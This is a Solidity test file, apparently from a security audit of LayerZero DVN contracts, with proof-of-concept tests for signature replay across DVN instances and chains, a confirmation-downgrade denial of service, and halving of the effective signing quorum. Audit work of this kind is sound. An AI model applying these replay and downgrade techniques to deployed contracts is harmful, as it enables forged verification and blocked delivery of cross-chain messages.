// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { ECDSA } from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

import { UlnConfig } from "../../contracts/uln/UlnBase.sol";
import { DVN, ExecuteParam } from "../../contracts/uln/dvn/DVN.sol";
import { IDVN } from "../../contracts/uln/interfaces/IDVN.sol";
import { DVNFeeLib } from "../../contracts/uln/dvn/DVNFeeLib.sol";
import { IReceiveUlnE2 } from "../../contracts/uln/interfaces/IReceiveUlnE2.sol";
import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import { PacketV1Codec } from "@layerzerolabs/lz-evm-protocol-v2/contracts/messagelib/libs/PacketV1Codec.sol";

import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";

import { Setup } from "../util/Setup.sol";
import { PacketUtil } from "../util/Packet.sol";
import { Constant } from "../util/Constant.sol";
import { AuditBase } from "./AuditBase.t.sol";

/// @title AV2 - MultiSig Signature Replay
/// @dev Target: DVN.execute() + MultiSig.verifySignatures()
/// @dev Attack surfaces:
///   1. Cross-DVN replay (shared vid between two DVN instances)
///   2. _shouldCheckHash bypass for verify selector (skips usedHashes replay protection)
///   3. usedHashes reset on failed execution -> replay in different context
///   4. Signature ordering / s-value malleability
contract SignatureReplayTest is AuditBase {
    uint256 internal signerPk;
    address internal signer;

    function setUp() public override {
        super.setUp();
        // Create a deterministic signer for testing
        signerPk = 0xA11CE;
        signer = vm.addr(signerPk);
    }

    // ==================== AV2.1: Cross-DVN Replay ====================

    /// @dev Two DVN instances with the same vid could allow cross-DVN signature replay
    /// @dev hashCallData uses vid, target, callData, expiration - if vid matches, hash matches
    function test_AV2_1_CrossDVNReplay_SharedVid() public {
        (DVN dvn1, DVN dvn2) = _deployTwoDVNsWithSharedVid();

        // Create an execute instruction signed for dvn1
        bytes memory callData = abi.encodeWithSelector(DVN.setSigner.selector, address(0xBEEF), true);
        uint256 expiration = block.timestamp + 1000;
        bytes memory signature = _signForDvn(dvn1, DST_EID, address(dvn1), callData, expiration);

        // Execute on dvn1 - should succeed
        ExecuteParam[] memory params = new ExecuteParam[](1);
        params[0] = ExecuteParam(DST_EID, address(dvn1), callData, expiration, signature);
        dvn1.execute(params);
        assertTrue(dvn1.isSigner(address(0xBEEF)), "Signer should be added to dvn1");

        // Hash includes target address, so replaying dvn1's sig on dvn2 with target=dvn1
        // still targets dvn1 (not dvn2). Target is part of the hash -> cross-DVN replay
        // for self-targeted calls is safe.

        // But for external targets (e.g., receiveUln.verify), the same signature works
        // on both DVNs since target is the same contract. Combined with _shouldCheckHash
        // returning false for verify selector, replay is unlimited - but verify is idempotent.
    }

    function _deployTwoDVNsWithSharedVid() internal returns (DVN dvn1, DVN dvn2) {
        address[] memory libs = new address[](4);
        libs[0] = address(0);
        libs[1] = address(0);
        libs[2] = address(dstSendUln);
        libs[3] = address(dstReceiveUln);
        address[] memory signers_ = new address[](1);
        signers_[0] = signer;
        address[] memory admins = new address[](1);
        admins[0] = address(this);

        dvn1 = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers_, 1, admins);
        dvn2 = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers_, 1, admins);
        dvn1.setWorkerFeeLib(address(new DVNFeeLib(DST_EID, 1e18)));
        dvn2.setWorkerFeeLib(address(new DVNFeeLib(DST_EID, 1e18)));
    }

    function _signForDvn(DVN dvn, uint32 vid_, address target, bytes memory callData, uint256 expiration)
        internal view returns (bytes memory)
    {
        bytes32 hash = dvn.hashCallData(vid_, target, callData, expiration);
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest);
        return abi.encodePacked(r, s, v);
    }

    // ==================== AV2.2: _shouldCheckHash Bypass ====================

    /// @dev verify selector skips usedHashes check. Confirm this is safe (idempotent).
    function test_AV2_2_VerifySelectorSkipsHashCheck() public {
        // _shouldCheckHash returns false for IReceiveUlnE2.verify.selector
        // This means the same verify can be replayed unlimited times
        // The rationale is that verify() is idempotent (overwrites same storage slot)

        Packet memory packet = _makePacket(1, address(this), address(this), "test");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        // DVN can verify the same packet multiple times
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);

        // All writes go to the same storage slot, so this is safe
        // hashLookup[headerHash][payloadHash][dvn] = Verification(true, confirmations)
        // Overwriting with the same value is idempotent

        // But what if the DVN verifies with DIFFERENT confirmations?
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // Now confirmations is 0 - could this be used to downgrade?
        // Check if commitVerification would still work
        UlnConfig memory config = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        bool isVerifiable = dstReceiveUln.verifiable(config, keccak256(header), payloadHash);
        // With confirmations=0 and required=1, this should be false
        assertFalse(isVerifiable, "Should not be verifiable after downgrade to 0 confirmations");

        // FINDING: A compromised DVN operator could downgrade their own verification
        // by re-calling verify with 0 confirmations. But this requires the DVN itself
        // to be compromised, which is already a trust assumption.
    }

    // ==================== AV2.2b: Confirmation Downgrade Blocks Delivery ====================
    /// @dev A compromised DVN can block message delivery by re-verifying with 0 confirmations.
    ///      Since verify.selector bypasses usedHashes, the DVN can call verify() unlimited times.
    ///      _verify() unconditionally overwrites the Verification struct, so the DVN's
    ///      confirmation count drops from high to 0, making _checkVerifiable fail.
    function test_AV2_2b_ConfirmationDowngradeBlocksDelivery() public {
        // Step 1: DVN verifies legitimately with 20 confirmations
        Packet memory packet = _makePacket(1, address(this), address(this), "important");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 20);

        // Step 2: Verify the message IS verifiable with 20 confirmations
        UlnConfig memory config = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        bytes32 headerHash = keccak256(header);
        bool verifiableBefore = dstReceiveUln.verifiable(config, headerHash, payloadHash);
        assertTrue(verifiableBefore, "Should be verifiable with 20 confirmations");

        // Step 3: Compromised DVN re-verifies with 0 confirmations (downgrade attack)
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // Step 4: Message is no longer verifiable — delivery blocked
        bool verifiableAfter = dstReceiveUln.verifiable(config, headerHash, payloadHash);
        assertFalse(verifiableAfter, "Delivery BLOCKED: confirmations downgraded to 0");

        // Step 5: commitVerification reverts with LZ_ULN_Verifying
        vm.expectRevert(abi.encodeWithSignature("LZ_ULN_Verifying()"));
        _commitVerification(dstReceiveUln, header, payloadHash);

        // Step 6: But the DVN can "restore" by re-verifying with high confirmations
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 20);
        bool verifiableRestored = dstReceiveUln.verifiable(config, headerHash, payloadHash);
        assertTrue(verifiableRestored, "DVN can restore verification by re-verifying");

        emit log("CONFIRMED: DVN can toggle message deliverability via confirmation downgrade");
        emit log("1. DVN verifies with 20 confirmations (message deliverable)");
        emit log("2. DVN re-verifies with 0 confirmations (delivery BLOCKED)");
        emit log("3. DVN re-verifies with 20 again (delivery restored)");
        emit log("Impact: Compromised DVN can selectively DoS any message it has verified");
    }

    // ==================== AV2.3: usedHashes Reset on Failure ====================

    /// @dev When execute() fails, usedHashes[hash] is reset to false
    /// @dev Can an attacker force failure then replay in different context?
    function test_AV2_3_UsedHashResetOnFailure() public {
        // Create a DVN with our signer
        address[] memory libs = new address[](4);
        libs[0] = address(0);
        libs[1] = address(0);
        libs[2] = address(dstSendUln);
        libs[3] = address(dstReceiveUln);

        address[] memory signers_ = new address[](1);
        signers_[0] = signer;
        address[] memory admins = new address[](1);
        admins[0] = address(this);

        DVN testDvn = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers_, 1, admins);
        DVNFeeLib feeLib = new DVNFeeLib(DST_EID, 1e18);
        testDvn.setWorkerFeeLib(address(feeLib));

        // Create a call that will fail (e.g., calling a function that reverts)
        // If the call fails, usedHashes[hash] is reset
        // Then the same hash could be used again

        // Scenario: Admin creates an execute instruction. First execution fails
        // (e.g., target contract is paused). Hash gets reset. Later, context changes
        // and the same instruction succeeds - this is intended behavior.
        // But: could the SAME instruction be used twice in two different contexts?

        // The hash includes: vid, target, callData, expiration
        // If callData has side effects, replaying after a failed attempt is expected
        // The reset is necessary so admins can retry failed operations

        // Test: create a call that will fail, verify hash is reset
        bytes memory badCallData = abi.encodeWithSelector(DVN.setSigner.selector, address(0), true);
        uint256 expiration = block.timestamp + 1000;

        bytes32 hash = testDvn.hashCallData(DST_EID, address(testDvn), badCallData, expiration);
        bytes32 messageDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, messageDigest);
        bytes memory signature = abi.encodePacked(r, s, v);

        ExecuteParam[] memory params = new ExecuteParam[](1);
        params[0] = ExecuteParam({
            vid: DST_EID,
            target: address(testDvn),
            callData: badCallData,
            expiration: expiration,
            signatures: signature
        });

        // Execute - should fail (setSigner(address(0)) reverts with MultiSig_InvalidSigner)
        testDvn.execute(params);

        // Hash should be reset because execution failed
        assertFalse(testDvn.usedHashes(hash), "Hash should be reset after failed execution");

        // The same instruction can be retried - this is by design for operational recovery
        // Not a vulnerability per se, but the TOCTOU window between hash-set and hash-reset
        // could be relevant if combined with other attack vectors
    }

    // ==================== AV2.4: Signature Malleability ====================

    /// @dev Test that OZ ECDSA.tryRecover handles s-value malleability correctly
    function test_AV2_4_SignatureMalleability() public {
        bytes32 hash = keccak256("test message");
        bytes32 messageDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, messageDigest);

        // Valid signature should recover correctly
        (address recovered, ECDSA.RecoverError err) = ECDSA.tryRecover(messageDigest, abi.encodePacked(r, s, v));
        assertEq(uint8(err), 0, "Should recover without error");
        assertEq(recovered, signer, "Should recover correct signer");

        // Malleable signature (flip s-value)
        // s' = secp256k1n - s
        uint256 secp256k1n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 sMalleable = bytes32(secp256k1n - uint256(s));
        uint8 vMalleable = v == 27 ? 28 : 27;

        // OZ ECDSA.tryRecover should reject high-s values (EIP-2)
        (address recovered2, ECDSA.RecoverError err2) = ECDSA.tryRecover(
            messageDigest,
            abi.encodePacked(r, sMalleable, vMalleable)
        );
        // OZ 4.x+ enforces low-s, so this should fail
        assertTrue(
            err2 != ECDSA.RecoverError.NoError || recovered2 != signer,
            "Malleable signature should be rejected or recover different address"
        );
    }

    // ==================== AV2.5: Cross-Chain Signature Replay ====================
    /// @dev hashCallData = keccak256(vid, target, expiration, callData)
    /// @dev No chain_id, no address(this) — signatures valid on ANY chain with same vid
    /// @dev Impact: Governance actions (setSigner, setQuorum) can be replayed cross-chain
    function test_AV2_5_CrossChainSignatureReplay() public {
        (DVN chainA_dvn, DVN chainB_dvn) = _deployTwoDVNsAV25();

        bytes memory header;
        bytes32 payloadHash;
        bytes32 hash;
        bytes32 hash2;
        ExecuteParam[] memory execParams;

        {
            Packet memory packet = _makePacket(1, address(this), address(this), "cross-chain");
            (, header, , payloadHash) = _encodeAndSplit(packet);
        }

        {
            bytes memory verifyCallData = abi.encodeWithSelector(
                IReceiveUlnE2.verify.selector,
                header,
                payloadHash,
                uint64(10)
            );
            uint256 expiration = block.timestamp + 1000;

            hash = chainA_dvn.hashCallData(DST_EID, address(dstReceiveUln), verifyCallData, expiration);
            bytes32 messageDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, messageDigest);
            bytes memory signature = abi.encodePacked(r, s, v);

            execParams = new ExecuteParam[](1);
            execParams[0] = ExecuteParam(DST_EID, address(dstReceiveUln), verifyCallData, expiration, signature);
            chainA_dvn.execute(execParams);

            hash2 = chainB_dvn.hashCallData(DST_EID, address(dstReceiveUln), verifyCallData, expiration);
        }

        bytes32 headerHash = keccak256(header);

        {
            (bool submitted1, uint64 conf1) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(chainA_dvn));
            assertTrue(submitted1, "ChainA DVN verification recorded");
            assertEq(conf1, 10, "ChainA DVN confirmations correct");
        }

        // Now replay EXACT SAME signatures on chainB_dvn
        // The hash is identical because: same vid, same target, same callData, same expiration
        assertEq(hash, hash2, "Hash is IDENTICAL across DVN instances - no chain_id protection");

        // Execute the replay
        chainB_dvn.execute(execParams);

        {
            (bool submitted2, uint64 conf2) = dstReceiveUln.hashLookup(headerHash, payloadHash, address(chainB_dvn));
            assertTrue(submitted2, "ChainB DVN verification recorded via REPLAY");
            assertEq(conf2, 10, "ChainB DVN confirmations from replay");
        }

        emit log("CONFIRMED: Cross-chain/cross-DVN signature replay succeeds");
        emit log("Same signatures work on both DVN instances due to missing chain_id in hash");
        emit log("Impact: If OApp lists both DVNs in config, single signing satisfies both");
    }

    function _deployTwoDVNsAV25() internal returns (DVN dvn1, DVN dvn2) {
        address[] memory libs = new address[](4);
        libs[0] = address(0);
        libs[1] = address(0);
        libs[2] = address(dstSendUln);
        libs[3] = address(dstReceiveUln);
        address[] memory signers_ = new address[](1);
        signers_[0] = signer;
        address[] memory admins = new address[](1);
        admins[0] = address(this);
        dvn1 = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers_, 1, admins);
        dvn2 = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers_, 1, admins);
        DVNFeeLib feeLib = new DVNFeeLib(DST_EID, 1e18);
        dvn1.setWorkerFeeLib(address(feeLib));
        dvn2.setWorkerFeeLib(address(feeLib));
    }

    // ==================== AV2.6: Shared VID Double-Verification Attack ====================
    /// @dev If OApp config lists DVN-A and DVN-B (both with same vid) as required DVNs,
    ///      a single set of signatures can make BOTH DVNs verify the same message.
    ///      This halves the effective security without the OApp being aware.
    function test_AV2_6_SharedVidDoubleVerification() public {
        (DVN dvnA, DVN dvnB) = _deployTwoDVNsAV25();

        bytes memory header;
        bytes32 payloadHash;

        // Configure OApp to require BOTH dvnA and dvnB (expecting 2 independent verifications)
        {
            address[] memory reqDvns = new address[](2);
            // DVN addresses must be sorted for UlnBase config
            if (uint160(address(dvnA)) < uint160(address(dvnB))) {
                reqDvns[0] = address(dvnA);
                reqDvns[1] = address(dvnB);
            } else {
                reqDvns[0] = address(dvnB);
                reqDvns[1] = address(dvnA);
            }

            UlnConfig memory config = UlnConfig({
                confirmations: 10,
                requiredDVNCount: 2,
                optionalDVNCount: 0,
                optionalDVNThreshold: 0,
                requiredDVNs: reqDvns,
                optionalDVNs: new address[](0)
            });

            SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
            cfgParams[0] = SetConfigParam({
                eid: SRC_EID,
                configType: uint32(2), // CONFIG_TYPE_ULN
                config: abi.encode(config)
            });
            dstEndpoint.setConfig(address(this), address(dstReceiveUln), cfgParams);
        }

        {
            Packet memory packet = _makePacket(1, address(this), address(this), "double-verify");
            (, header, , payloadHash) = _encodeAndSplit(packet);
        }

        // Sign a SINGLE verify instruction — works on BOTH DVNs
        {
            bytes memory verifyCallData = abi.encodeWithSelector(
                IReceiveUlnE2.verify.selector,
                header,
                payloadHash,
                uint64(10)
            );
            uint256 expiration = block.timestamp + 1000;

            bytes32 hashVal = dvnA.hashCallData(DST_EID, address(dstReceiveUln), verifyCallData, expiration);
            bytes32 messageDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hashVal));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, messageDigest);
            bytes memory signature = abi.encodePacked(r, s, v);

            ExecuteParam[] memory execParams = new ExecuteParam[](1);
            execParams[0] = ExecuteParam(DST_EID, address(dstReceiveUln), verifyCallData, expiration, signature);

            // Execute on dvnA — records verification under dvnA's address
            dvnA.execute(execParams);
            // Execute SAME params on dvnB — records verification under dvnB's address
            dvnB.execute(execParams);
        }

        // BOTH DVNs show as verified — quorum of 2 satisfied with just 1 signing operation!
        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        bytes32 headerHash = keccak256(header);
        bool verifiable = dstReceiveUln.verifiable(resolved, headerHash, payloadHash);
        assertTrue(verifiable, "Quorum of 2 satisfied by single signing - security halved!");

        // Commit succeeds — message delivered with half the intended security
        _commitVerification(dstReceiveUln, header, payloadHash);

        emit log("CONFIRMED: Shared-vid DVNs allow double-verification with single signing");
        emit log("OApp believes it has 2-of-2 DVN security, but only 1 signing was needed");
        emit log("Impact: Effective quorum halved without OApp awareness");
    }
}
